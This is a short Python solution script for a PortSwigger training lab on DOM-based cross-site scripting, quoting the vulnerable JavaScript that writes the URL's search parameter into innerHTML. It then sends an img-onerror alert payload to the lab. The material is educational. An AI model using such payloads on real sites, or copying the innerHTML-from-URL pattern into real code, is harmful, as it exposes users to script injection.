'''
This lab contains a DOM-based cross-site scripting vulnerability in the search blog functionality. It uses an innerHTML assignment, which changes the HTML contents of a div element, using data from location.search.

To solve this lab, perform a cross-site scripting attack that calls the alert function.

Lab link: https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-innerhtml-sink
'''

'''Vulnurable code
<script>
                            function doSearchQuery(query) {
                                document.getElementById('searchMessage').innerHTML = query;
                            }
                            var query = (new URLSearchParams(window.location.search)).get('search');
                            if(query) {
                                doSearchQuery(query);
                            }
                        </script>
'''

import requests


lab_id = '0a0600c6039610d68208ce7000db0014' #change based on generated lab
payload = "<img src=1 onerror=alert(1)>" # search paramter pouplates location.serach source and innerHTML sink despoits malicious code
uri = f"https://{lab_id}.web-security-academy.net/?search={payload}" 

r = requests.get(uri)
if "solved" in r.text:
    print("solved")
else:
    print("nope")